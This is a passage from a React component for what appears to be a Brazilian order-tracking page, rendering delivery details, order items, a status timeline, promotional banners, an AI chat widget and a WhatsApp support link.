                              ? 'bg-indigo-600 border-indigo-500 text-white ring-4 ring-indigo-500/20 scale-110'
                              : isActive
                              ? 'bg-slate-900 border-indigo-500 text-indigo-400'
                              : 'bg-slate-950 border-slate-800 text-slate-600'
                          }`}>
                            <StepIcon className="w-4 h-4" />
                          </div>
                          <span className={`text-[10px] sm:text-xs font-semibold mt-3 ${
                            isCurrent ? 'text-white' : isActive ? 'text-slate-300' : 'text-slate-600'
                          }`}>
                            {stepInfo.label}
                          </span>
                        </div>
                      );
                    })}
                  </div>
                </div>
              )}
            </div>

            {/* Dados do Cliente e Pedido */}
            {data.customer && (
              <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-4">
                <h3 className="text-base font-bold text-white flex items-center gap-2">
                  👤 Informações de Entrega
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
                  <div className="space-y-2">
                    <div>
                      <span className="text-xs text-slate-500 block">Nome do Cliente</span>
                      <span className="font-semibold text-slate-200">{data.customer.nome}</span>
                    </div>
                    <div>
                      <span className="text-xs text-slate-500 block">CPF (Protegido)</span>
                      <span className="font-mono text-slate-300">{data.customer.cpf}</span>
                    </div>
                  </div>
                  <div className="space-y-2">
                    <div>
                      <span className="text-xs text-slate-500 block">E-mail</span>
                      <span className="text-slate-300">{data.customer.email}</span>
                    </div>
                    {data.numero_pedido && (
                      <div>
                        <span className="text-xs text-slate-500 block">Pedido Associado</span>
                        <span className="font-bold text-indigo-400">#{data.numero_pedido}</span>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            )}

            {/* 🛍️ Itens do Pedido */}
            {data.itens && data.itens.length > 0 && (
              <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-4 animate-fadeIn">
                <h3 className="text-base font-bold text-white flex items-center gap-2">
                  <ShoppingBag className="w-5 h-5 text-indigo-400" /> Itens do Pedido
                </h3>
                <div className="divide-y divide-slate-800/60 space-y-3">
                  {data.itens.map((item: any, idx: number) => (
                    <div key={idx} className="flex items-center justify-between pt-3 first:pt-0 gap-4">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-xl bg-slate-950 border border-slate-800 flex items-center justify-center text-slate-400">
                          <Package className="w-5 h-5 text-indigo-500/80" />
                        </div>
                        <div>
                          <span className="font-semibold text-slate-200 text-sm block leading-tight">{item.title}</span>
                          {item.sku && <span className="text-[10px] text-slate-500 font-mono">SKU: {item.sku}</span>}
                        </div>
                      </div>
                      <div className="text-right">
                        <span className="text-sm font-bold text-slate-200 block">Qtd: {item.quantity}</span>
                        {item.price && <span className="text-xs text-slate-400">R$ {parseFloat(item.price).toFixed(2)}</span>}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Timeline history */}
            <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl">
              <h3 className="text-lg font-bold text-white mb-6 flex items-center gap-2">
                Histórico de Atualizações
              </h3>

              {data.historico.length === 0 ? (
                <div className="text-center py-8 text-slate-500 text-sm">
                  Nenhum evento registrado ainda.
                </div>
              ) : (
                <div className="relative border-l-2 border-slate-800 ml-4 pl-6 space-y-8">
                  {data.historico.slice().reverse().map((event, idx) => {
                    const info = getStatusInfo(event.status);
                    const EventIcon = info.icon;
                    const eventDate = new Date(event.data);
                    
                    return (
                      <div key={idx} className="relative">
                        <div className={`absolute -left-[35px] top-0.5 w-6 h-6 rounded-full flex items-center justify-center ${
                          idx === 0 ? info.color : 'bg-slate-800 text-slate-400'
                        } border border-slate-950`}>
                          <EventIcon className="w-3.5 h-3.5" />
                        </div>
                        
                        <div className="space-y-1">
                          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-1">
                            <span className={`font-semibold text-sm ${idx === 0 ? 'text-white' : 'text-slate-300'}`}>
                              {event.descricao}
                            </span>
                            <div className="flex items-center gap-3 text-xs text-slate-500">
                              <span className="flex items-center gap-1">
                                <Calendar className="w-3.5 h-3.5" />
                                {eventDate.toLocaleDateString('pt-BR')}
                              </span>
                              <span className="flex items-center gap-1">
                                <Clock className="w-3.5 h-3.5" />
                                {eventDate.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}
                              </span>
                            </div>
                          </div>
                          
                          <div className="flex items-center gap-1.5 text-xs text-slate-400">
                            <MapPin className="w-3.5 h-3.5 text-slate-500" />
                            <span>{event.local}</span>
                          </div>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>

            {/* 🛍️ BANNER DE UPSELL / OFERTA DE RECOMPRA */}
            {data.upsell_info?.ativo && (
              <div className="bg-gradient-to-r from-violet-950/80 via-slate-900 to-indigo-950/80 border border-violet-500/30 rounded-2xl p-6 shadow-xl flex flex-col md:flex-row items-center justify-between gap-6">
                <div className="flex items-center gap-4">
                  {data.upsell_info.imagem_url ? (
                    <img src={data.upsell_info.imagem_url} alt="Produto em Oferta" className="w-16 h-16 rounded-xl object-cover border border-violet-500/30 shrink-0" />
                  ) : (
                    <div className="p-3.5 rounded-2xl bg-violet-500/20 text-violet-400 border border-violet-500/30 shrink-0">
                      <ShoppingBag className="w-8 h-8" />
                    </div>
                  )}
                  <div className="space-y-1">
                    <span className="text-[10px] uppercase font-bold text-violet-400 tracking-wider">Oferta Exclusiva de Recompra</span>
                    <h4 className="text-base font-extrabold text-white">{data.upsell_info.titulo}</h4>
                    <p className="text-xs text-slate-300">{data.upsell_info.descricao}</p>
                  </div>
                </div>

                {data.upsell_info.link && (
                  <a
                    href={data.upsell_info.link}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="w-full md:w-auto px-6 py-3 bg-violet-600 hover:bg-violet-500 text-white font-bold rounded-xl text-center text-xs shadow-lg transition-all hover:scale-105 shrink-0"
                  >
                    Aproveitar Oferta 🛒
                  </a>
                )}
              </div>
            )}

            {/* Banner Estático da Loja se configurado */}
            {data.store?.banner_url && (
              <div className="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden shadow-xl transition-all hover:border-indigo-500/40">
                {data.store.banner_link ? (
                  <a href={data.store.banner_link} target="_blank" rel="noopener noreferrer" className="block group">
                    <img src={data.store.banner_url} alt="Oferta Especial" className="w-full h-auto object-cover group-hover:scale-[1.01] transition-transform" />
                  </a>
                ) : (
                  <img src={data.store.banner_url} alt="Oferta Especial" className="w-full h-auto object-cover" />
                )}
              </div>
            )}

          </div>
          )
        ) : null}

        {/* 🤖 WIDGET DE CHATBOT COM IA FLUTUANTE */}
        {!showCheckout && (
          <div className="fixed bottom-6 right-6 z-50 flex flex-col items-end gap-3">
            {showAiChat && (
              <div className="w-[340px] sm:w-[380px] h-[480px] bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl flex flex-col overflow-hidden animate-in fade-in slide-in-from-bottom-5">
              {/* Header do Chat */}
              <div className="p-4 bg-slate-950 border-b border-slate-800 flex items-center justify-between">
                <div className="flex items-center gap-2.5">
                  <div className="p-2 rounded-xl bg-indigo-500/20 text-indigo-400 border border-indigo-500/30">
                    <Bot className="w-5 h-5" />
                  </div>
                  <div>
                    <h4 className="text-sm font-bold text-white flex items-center gap-1.5">
                      Assistente de Rastreio <Sparkles className="w-3.5 h-3.5 text-amber-400 fill-amber-400" />
                    </h4>
                    <span className="text-[10px] text-emerald-400 flex items-center gap-1">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" /> Online 24/7
                    </span>
                  </div>
                </div>
                <button
                  onClick={() => setShowAiChat(false)}
                  className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Corpo de Mensagens */}
              <div className="flex-1 overflow-y-auto p-4 space-y-3 bg-slate-950/40">
                {chatMessages.map((msg, idx) => (
                  <div
                    key={idx}
                    className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}
                  >
                    <div
                      className={`max-w-[82%] px-3.5 py-2.5 rounded-2xl text-xs leading-relaxed ${
                        msg.sender === 'user'
                          ? 'bg-indigo-600 text-white rounded-br-none'
                          : 'bg-slate-800 text-slate-200 border border-slate-700/60 rounded-bl-none'
                      }`}
                    >
                      {msg.text}
                    </div>
                  </div>
                ))}
                {aiLoading && (
                  <div className="flex justify-start">
                    <div className="bg-slate-800 text-slate-400 px-3.5 py-2.5 rounded-2xl text-xs flex items-center gap-2 border border-slate-700/60">
                      <Bot className="w-3.5 h-3.5 animate-bounce" /> Digitando resposta...
                    </div>
                  </div>
                )}
              </div>

              {/* Form de Envio */}
              <form onSubmit={handleSendAiMessage} className="p-3 bg-slate-950 border-t border-slate-800 flex items-center gap-2">
                <input
                  type="text"
                  value={inputMsg}
                  onChange={e => setInputMsg(e.target.value)}
                  placeholder="Pergunte sobre a entrega..."
                  className="flex-1 px-3.5 py-2 bg-slate-900 border border-slate-800 rounded-xl text-xs text-white placeholder-slate-500 focus:outline-none focus:border-indigo-500"
                />
                <button
                  type="submit"
                  disabled={!inputMsg.trim() || aiLoading}
                  className="p-2.5 bg-indigo-600 hover:bg-indigo-500 disabled:opacity-50 text-white rounded-xl transition-colors"
                >
                  <Send className="w-4 h-4" />
                </button>
              </form>
            </div>
          )}

          <div className="flex items-center gap-2">
            {data?.store?.whatsapp_suporte && (
              <a
                href={`https://wa.me/${data.store.whatsapp_suporte.replace(/\D/g, '')}?text=${encodeURIComponent(`Olá, preciso de suporte em relação ao pedido #${data.numero_pedido || ''} (${data.codigo})`)}`}
                target="_blank"
                rel="noopener noreferrer"
                className="px-3.5 py-2.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-full font-bold text-xs shadow-2xl flex items-center gap-2 transition-all hover:scale-105"
              >
                💬 WhatsApp
              </a>
            )}

            <button
              onClick={() => setShowAiChat(!showAiChat)}
              className="px-4 py-3 bg-indigo-600 hover:bg-indigo-500 text-white rounded-full font-bold text-xs shadow-2xl flex items-center gap-2 transition-all hover:scale-105"
            >
              <Bot className="w-4 h-4" />
              <span>Dúvidas? Fale com a IA</span>
            </button>
          </div>
        </div>
        )}

      </div>
    </div>
  );
}
